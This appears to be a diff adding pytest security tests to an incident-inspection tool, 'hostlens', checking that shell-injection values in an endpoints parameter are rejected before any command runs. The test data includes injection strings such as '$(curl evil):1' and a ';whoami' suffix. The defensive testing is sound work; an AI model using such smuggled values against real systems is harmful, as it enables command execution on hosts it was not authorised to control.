@@ -24,12 +24,15 @@ from pathlib import Path
 
 import jinja2
 import pytest
+import structlog
 
 import hostlens.inspectors as _inspectors_pkg
 from hostlens.core.config import Settings
 from hostlens.inspectors.loader import load_manifest
 from hostlens.inspectors.registry import build_registry_from_search_paths
-from hostlens.inspectors.runner import _sh_filter
+from hostlens.inspectors.runner import InspectorRunner, _sh_filter
+from hostlens.targets.base import Capability, ExecResult
+from hostlens.targets.registry import TargetRegistry
 
 # The 11 incident-pack Inspector names (point-namespaced) mapped to their
 # manifest file path relative to the builtin root (underscore filenames).
@@ -134,3 +137,91 @@ def test_tls_cert_expiry_escapes_injection_payloads() -> None:
         quoted = shlex.quote(payload)
         assert quoted in rendered
     assert "$(curl evil)" not in rendered.replace(shlex.quote("$(curl evil)"), "")
+
+
+# --------------------------------------------------------------------------- #
+# Option E (agent → JSON-decoded array param) security: a hostile value is
+# rejected by jsonschema BEFORE the main command renders / reaches target.exec.
+# The render-level tests above pass a Python `list`; these drive the real
+# `runner.run` coercion path the Agent surface actually uses (a JSON-encoded
+# string in `parameters: dict[str, str]`).
+# --------------------------------------------------------------------------- #
+
+
+class _SpyTarget:
+    """Records every `exec` command; returns canned ok for probes + main."""
+
+    name = "spy-host"
+    type = "local"
+
+    def __init__(self) -> None:
+        self.capabilities = {Capability.SHELL}
+        self.exec_cmds: list[str] = []
+
+    async def exec(
+        self, cmd: str, *, timeout: int, env: dict[str, str] | None = None
+    ) -> ExecResult:
+        del timeout, env
+        self.exec_cmds.append(cmd)
+        if cmd.startswith("command -v "):
+            stdout = "/usr/bin/nc\n"
+        else:
+            stdout = '{"results":[{"endpoint":"service:5432","reachable":true}]}'
+        return ExecResult(
+            exit_code=0, stdout=stdout, stderr="", duration_seconds=0.0, timed_out=False
+        )
+
+    async def read_file(self, path: str) -> bytes:  # pragma: no cover - unused here
+        raise AssertionError(f"_SpyTarget.read_file unexpectedly called: {path!r}")
+
+
+def _tcp_check_runner() -> tuple[InspectorRunner, object]:
+    runner = InspectorRunner(
+        TargetRegistry(),
+        settings=Settings(),
+        logger=structlog.get_logger("incident-security-test"),
+    )
+    manifest = load_manifest(_builtin_root() / INCIDENT_PACK["net.dependency.tcp_check"])
+    return runner, manifest
+
+
+@pytest.mark.parametrize(
+    "hostile_endpoints",
+    [
+        '["database:5432;whoami"]',  # valid JSON array, item breaks items.pattern
+        '["database:5432","$(curl evil):1"]',  # command substitution in an item
+        "database:5432",  # non-JSON string: Option E leaves it; jsonschema rejects (not array)
+        '{"host":"database","port":5432}',  # JSON object where array is required
+    ],
+)
+async def test_option_e_hostile_param_rejected_before_exec(hostile_endpoints: str) -> None:
+    runner, manifest = _tcp_check_runner()
+    target = _SpyTarget()
+
+    result = await runner.run(manifest, target, parameters={"endpoints": hostile_endpoints})
+
+    assert result.status == "exception"
+    assert result.error is not None
+    assert result.error.startswith("parameter_validation_failed")
+    # The hostile value never reaches a rendered command. Preflight may probe
+    # `command -v nc`, but the main collect command (the only place endpoints
+    # render) must never be exec'd with the payload.
+    for cmd in target.exec_cmds:
+        assert "whoami" not in cmd
+        assert "curl evil" not in cmd
+        assert "printf" not in cmd  # the main command's first token; never reached
+
+
+async def test_option_e_valid_json_array_reaches_render() -> None:
+    """A well-formed JSON-encoded array decodes, validates, and renders —
+    proving the rejection tests above are not vacuously passing."""
+    runner, manifest = _tcp_check_runner()
+    target = _SpyTarget()
+
+    result = await runner.run(manifest, target, parameters={"endpoints": '["service:5432"]'})
+
+    assert result.status == "ok"
+    # The decoded endpoint reached the rendered main command.
+    main_cmds = [c for c in target.exec_cmds if "for ep in" in c]
+    assert main_cmds, "main collect command was never exec'd"
+    assert "service:5432" in main_cmds[0]
